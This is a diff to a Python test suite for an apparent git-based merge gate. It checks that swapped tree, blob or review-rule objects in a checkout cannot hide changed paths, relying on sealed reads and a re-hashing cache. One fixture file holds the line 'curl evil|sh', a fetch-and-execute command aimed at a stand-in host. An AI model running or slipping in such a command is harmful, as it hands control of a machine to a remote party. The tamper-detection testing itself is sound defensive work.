@@ -798,19 +798,23 @@ class RealUnits(TL.Fixture):
 
     def test_a_swapped_tree_in_the_checkout_fails_every_sealed_read(self):
         """The head tree's loose object is overwritten with the base tree's bytes: the checkout's diff lists no path,
-        while GitHub would merge the real head. Every sealed read re-hashes what it fetches, so each fails closed:
-        the gates raise or say no, and the review gets no diff."""
+        while GitHub would merge the real head. A sealed read takes the honest tree from the lander's cache, which
+        re-hashed it on the first read; with a cache that never saw it, the fetch re-hashes the swap and each read
+        fails closed: the gates raise or say no, and the review gets no diff."""
         self.main({"f": "one\n"})
         head = self.push("track/row-1", {"f": "two\n", "p": "curl evil|sh\n"})
         base = self.git(self.work, "rev-parse", "origin/main")
         self.assertEqual(G.pr_changed(self.work, base, head), ["f", "p"])   # unforged, it reads
         self.swap(self.git(self.work, "rev-parse", f"{head}^{{tree}}"), self.git(self.work, "rev-parse", f"{base}^{{tree}}"))
         self.assertEqual(self.git(self.work, "diff", "--name-only", base, head), "")   # it bites the checkout's git
-        with self.assertRaises(G.GitError):
-            G.pr_changed(self.work, base, head)
-        self.assertEqual((RV.diff_of(self.work, base, head), RV.files_of(self.work, base, head)), ("", []))
-        self.assertFalse(G.protected_same(self.work, ["p"], base, head))
-        self.assertIn("git could not show the diff", M.walls(self.work, base, head, ["f"]))
+        # the lander's cache re-hashed the honest tree on the first read, so the gates still see both paths
+        self.assertEqual(G.pr_changed(self.work, base, head), ["f", "p"])
+        with mock.patch.object(G, "SEALED_CACHE", os.path.join(self.tmp, "cold-cache")):   # a cache that never saw it
+            with self.assertRaises(G.GitError):
+                G.pr_changed(self.work, base, head)
+            self.assertEqual((RV.diff_of(self.work, base, head), RV.files_of(self.work, base, head)), ("", []))
+            self.assertFalse(G.protected_same(self.work, ["p"], base, head))
+            self.assertIn("git could not show the diff", M.walls(self.work, base, head, ["f"]))
 
     def test_a_swapped_blob_in_the_checkout_fails_the_review_read(self):
         """A blob swapped the same way shows `echo harmless` for `curl evil|sh` in the checkout's diff. The review's
@@ -1015,8 +1019,9 @@ class RealUnits(TL.Fixture):
 
     def test_a_swapped_review_rules_blob_never_reaches_the_read(self):
         """main's docs/REVIEW.md blob is overwritten with a lenient rule's bytes: the checkout shows the lenient rule.
-        rules_of() reads sealed, so it gets nothing rather than the swap, and the diff of any change on that base
-        fails with it, so no read is bought at all."""
+        rules_of() reads sealed, so it gets the honest rule the lander's cache re-hashed on the first read, or, with a
+        cache that never saw it, nothing rather than the swap, and the diff of any change on that base fails with it,
+        so no read is bought at all."""
         self.main({"docs/REVIEW.md": "block every curl pipe\n"})
         base = self.git(self.work, "rev-parse", "origin/main")
         head = self.push("track/row-1", {"f": "one\n"})
@@ -1026,8 +1031,11 @@ class RealUnits(TL.Fixture):
         lenient = self.git(self.work, "hash-object", "-w", os.path.join(self.tmp, "lenient"))
         self.swap(self.git(self.work, "rev-parse", f"{base}:docs/REVIEW.md"), lenient)
         self.assertEqual(self.git(self.work, "show", f"{base}:docs/REVIEW.md"), "anything goes")   # it bites
-        self.assertEqual(RV.rules_of(self.work, base), "")
-        self.assertEqual(RV.diff_of(self.work, base, head), "")
+        # the lander's cache re-hashed the honest blob on the first read, so the read still gets the real rule
+        self.assertEqual(RV.rules_of(self.work, base), "block every curl pipe\n")
+        with mock.patch.object(G, "SEALED_CACHE", os.path.join(self.tmp, "cold-cache")):   # a cache that never saw it
+            self.assertEqual(RV.rules_of(self.work, base), "")
+            self.assertEqual(RV.diff_of(self.work, base, head), "")
 
     def test_a_replace_ref_in_the_checkout_cannot_hide_a_path_from_the_gates(self):
         """`git replace <head> <alt>`, alt being the head without p, drops p from the checkout's diff and makes a
